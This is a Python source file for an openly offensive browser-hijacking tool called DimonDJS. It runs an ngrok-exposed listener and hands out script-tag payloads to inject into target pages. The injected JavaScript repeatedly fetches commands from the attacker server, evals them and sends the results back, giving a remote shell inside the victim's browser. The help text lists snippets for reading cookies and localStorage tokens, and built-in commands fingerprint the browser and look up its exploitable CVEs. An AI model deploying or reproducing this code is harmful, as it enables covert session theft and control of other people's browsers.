import http.server
import json
import socketserver
import requests
from pyngrok import ngrok

banner = """

  ____  _                       ____      _ ____  
 |  _ \(_)_ __ ___   ___  _ __ |  _ \    | / ___| 
 | | | | | '_ ` _ \ / _ \| '_ \| | | |_  | \___ \ 
 | |_| | | | | | | | (_) | | | | |_| | |_| |___) |
 |____/|_|_| |_| |_|\___/|_| |_|____/ \___/|____/  v1.3
                                                  
 <------------ Developed by DimonDev ------------>

"""

class ChatHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        return super(ChatHandler, self).end_headers()

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            print(self.headers)
            payload = '<script src="http://' + str(self.headers.get('Host')) + '/?command=get_script"></script>'
            self.wfile.write(payload.encode())
        elif self.path == '/shell':
            self.shell()
        elif self.path.startswith('/shell?resp='):
            response = self.path[12:]
            print()
            print(response)
            print()
            self.shell()
        elif self.path.startswith('/?command='):
            command = self.path[10:]
            if command == 'get_script':
                self.send_response(200)
                self.send_header('Content-type', 'text/javascript')
                self.end_headers()
                payload = 'function fetchServer(){fetch("http://' + str(self.headers.get('Host')) + '/shell").then(e=>e.text()).then(data=>{var result=eval(data);fetch("http://' + str(self.headers.get('Host')) + '/shell?resp="+result)}).catch(e=>{console.error("Error fetching data from server:",e)}).finally(()=>{setTimeout(fetchServer, 1000);})}fetchServer();'
                self.wfile.write(payload.encode())
            elif command == 'get_html':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                payload = '<script>function fetchServer(){fetch("http://' + str(self.headers.get('Host')) + '/shell").then(e=>e.text()).then(data=>{var result=eval(data);fetch("http://' + str(self.headers.get('Host')) + '/shell?resp="+result)}).catch(e=>{console.error("Error fetching data from server:",e)}).finally(()=>{setTimeout(fetchServer, 1000);})}fetchServer();</script>'
                self.wfile.write(payload.encode())
            else:
                self.send_error(404)
        else:
            self.send_error(404)

    def shell(self):
        cmd = str(input(f"{self.client_address[0]}~# "))
        if cmd == "help":
            print("""
---------------------------------------------------------
Usage:
    You can either input a Javascript snippet or use
    the internal commands.

Commands:
    help - Prints this message.
    getip - Fetches the public IP of the target.
    vulnscan - Scans for possible CVEs in the target
                browser.
    info CVE-0000-0000 - Information about a CVE.
    exploit CVE-0000-0000 - (For now, it only prints
                                exploit-db url)

Useful JavaScript:
    document.documentURI
    document.location
    document.domain
    document.body.innerHTML
    document.head.innerHTML
    document.cookie
    localStorage
    localStorage.getItem("SOME_ITEM_OR_TOKEN")
    navigator.userAgent
    navigator.platform
    navigator.vibrate()
    navigator.javaEnabled()
    navigator.languages
    navigator.maxTouchPoints
    navigator.buildID

----------------- Developed by DimonDev -----------------
            """)
            return
        if cmd == "getip":
            cmd = "fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => fetch('http://" + str(self.headers.get('Host')) + "/shell?resp='+data.ip)).catch(error => fetch('http://" + str(self.headers.get('Host')) + "/shell?resp='+error));"
        if cmd == "vulnscan":
            cmd = 'navigator.sayswho=function(){var e,r=navigator.userAgent,o=r.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)||[];return/trident/i.test(o[1])?"IE "+((e=/\brv[ :]+(\d+)/g.exec(r)||[])[1]||""):"Chrome"===o[1]&&null!=(e=r.match(/\b(OPR|Edge)\/(\d+)/))?e.slice(1).join(" ").replace("OPR","Opera"):(o=o[2]?[o[1],o[2]]:[navigator.appName,navigator.appVersion,"-?"],null!=(e=r.match(/version\/(\d+)/i))&&o.splice(1,1,e[1]),o.join(" "))}(),console.log(navigator.sayswho);const[browser,version]=navigator.sayswho.split(" ");var cpeString="";"Firefox"==browser?(cpeString=`cpe:2.3:a:mozilla:${browser.toLowerCase()}:${version}:*:*:*:*:*:*:*`,console.log(cpeString)):"Chrome"==browser?(cpeString=`cpe:2.3:a:google:${browser.toLowerCase()}:${version}:*:*:*:*:*:*:*`,console.log(cpeString)):"Safari"==browser?(cpeString=`cpe:2.3:a:apple:${browser.toLowerCase()}:${version}:*:*:*:*:*:*:*`,console.log(cpeString)):"Edge"==browser?(cpeString=`cpe:2.3:a:microsoft:${browser.toLowerCase()}:${version}:*:*:*:*:*:*:*`,console.log(cpeString)):"Opera"==browser?(cpeString=`cpe:2.3:a:opera:${browser.toLowerCase()}:${version}:*:*:*:*:*:*:*`,console.log(cpeString)):"IE"==browser&&(cpeString=`cpe:2.3:a:microsoft:internet_explorer:${version}:*:*:*:*:*:*:*`,console.log(cpeString));var cveIds=[],cveIdsString="";fetch("https://services.nvd.nist.gov/rest/json/cves/2.0?isVulnerable&cvssV3Severity=HIGH&cpeName="+cpeString).then(e=>e.json()).then(e=>{cveIds=e.vulnerabilities.map(e=>e.cve.id),console.log(cveIds),cveIdsString=cveIds.join("___"),console.log(cveIdsString),fetch("http://' + str(self.headers.get('Host')) + '/shell?resp=Possible_CVEs____"+cveIdsString)}).catch(e=>console.log(e));'
            print("\n[!] Scanning the target takes a bit of time, the request will probably arrive after the next two commands (You can also press ENTER until it arrives).\n")
        try:
            if cmd.split(" ")[0] == "info":
                cve_id = cmd.split(" ")[1]
                information = requests.get("https://cve.circl.lu/api/cve/" + cve_id).text
                if information == "null":
                    print("[-] CVE not found, or the input was invalid.")
                    return
                description = json.loads(information)["summary"]
                references = json.loads(information)["references"]
                print("--------------")
                print(cve_id)
                print("--------------")
                print("Description:")
                print(description)
                print()
                print("References:")
                for link in references:
                    print(link)
                print("----------------- Developed by DimonDev -----------------")
                return
        except Exception:
            print("\n[!?] Correct form of writing: info CVE-0000-0000\n")
        try:
            if cmd.split(" ")[0] == "exploit":
                cve_id = cmd.split(" ")[1]
                print("\nSearch for exploit here, or Google it:\n\nhttps://www.exploit-db.com/search?cve="+cve_id)
                print()
                return
        except Exception:
            print("\n[!?] Correct form of writing: exploit CVE-0000-0000\n")
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(cmd.encode())

if __name__ == '__main__':
    try:
        PORT = 6969
        Handler = ChatHandler
        print(banner)
        http_tunnel = ngrok.connect(6969, "http")
        print(f"""[!] Execute one of these payloads on the target:

Local target:

<script src="http://localhost:6969/?command=get_script"></script>
The HTML payload: http://localhost:6969/?command=get_html

Remote target:

<script src="{http_tunnel.public_url}/?command=get_script"></script>
The HTML payload: {http_tunnel.public_url}
""")
        print(f"[+] Listener server started over WAN - {http_tunnel.public_url}")
        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print("[+] Listening on port", PORT)
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("[!] Shutting down server and exiting...")
    finally:
        ngrok.kill()